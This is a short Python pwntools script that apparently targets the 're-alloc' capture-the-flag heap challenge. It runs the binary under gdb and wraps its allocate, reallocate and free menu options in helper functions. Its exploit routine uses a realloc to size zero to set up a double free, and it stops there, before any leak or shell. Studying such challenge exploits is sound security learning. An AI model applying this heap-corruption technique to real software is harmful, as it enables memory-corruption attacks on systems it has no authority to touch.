from pwn import *

realloc = ELF('re-alloc')
libc = ELF('libc.so')


class Prompts:
    CHOICE = 'Your choice: '
    INDEX = 'Index:'
    SIZE = 'Size:'
    DATA = 'Data:'


class Choices:
    ALLOC = '1'
    REALLOC = '2'
    FREE = '3'


p = gdb.debug(
    realloc.path,
    '''
    b *allocate+0xb5
    b *reallocate+0xc2
    b *rfree+0x55
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def alloc_chunk(index, size=24, data=None):
    print(f'[*] allocating a chunk at index: {index}')
    p.sendlineafter(Prompts.CHOICE, Choices.ALLOC)
    p.sendlineafter(Prompts.INDEX, str(index))
    p.sendlineafter(Prompts.SIZE, str(size))
    p.sendlineafter(Prompts.DATA, data if data else 'A' * size)


def free_chunk(index):
    print(f'[*] freeing a chunk at index: {index}')
    p.sendlineafter(Prompts.CHOICE, Choices.FREE)
    p.sendlineafter(Prompts.INDEX, str(index))


def realloc_chunk(index, size):
    print(f'[*] reallocating a chunk at index: {index} with size: {size}')
    p.sendlineafter(Prompts.CHOICE, Choices.REALLOC)
    p.sendlineafter(Prompts.INDEX, str(index))
    p.sendlineafter(Prompts.SIZE, str(size))
    if size:
        p.sendlineafter(Prompts.DATA, 'B' * size)


def double_free():
    print(f'[*] invoking a double free attack')
    alloc_chunk(0)
    realloc_chunk(0, 0)
    free_chunk(1)
    free_chunk(0)


def exploit():
    for i in range(2):
        alloc_chunk(i)

    for i in range(2):
        free_chunk(i)

    double_free()


if __name__ == "__main__":
    exploit()
